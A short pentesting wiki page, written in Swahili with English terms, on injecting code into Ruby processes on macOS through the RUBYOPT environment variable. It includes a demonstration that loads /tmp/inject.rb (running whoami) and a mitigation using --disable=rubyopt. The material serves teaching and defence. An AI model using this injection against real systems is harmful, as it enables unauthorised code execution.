# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby huchanganua command-line switches zinazotumika kutoka kwenye environment variable ya `RUBYOPT` kabla ya kuendesha script. Ruby hukataa utekelezaji wa code kupitia `-e` ndani ya `RUBYOPT`, lakini `-I` inaweza kuongeza directory ya kutafutia library na `-r` inaweza kuhitaji library. Kwa hiyo, process inayozindua Ruby ikiwa na environment variables zinazodhibitiwa na attacker inaweza kulazimishwa kupakia Ruby code inayodhibitiwa na attacker.<sup>[[1]](#references)</sup>

Unda `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Unda script ya Ruby isiyo na madhara kama vile `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Iendeshe kwa thamani ya `RUBYOPT` iliyodhibitiwa:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Ili kuzima tabia hii, pitisha `--disable=rubyopt` (au `--disable-rubyopt`) **kabla** ya jina la script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Chaguo lililoandikwa baada ya `hello.rb` hupitishwa kwa script kupitia `ARGV`; haliwezi kuzima uchakataji wa awali wa `RUBYOPT` na Ruby.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Nyaraka za Ruby - Chaguo za mstari wa amri wa Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
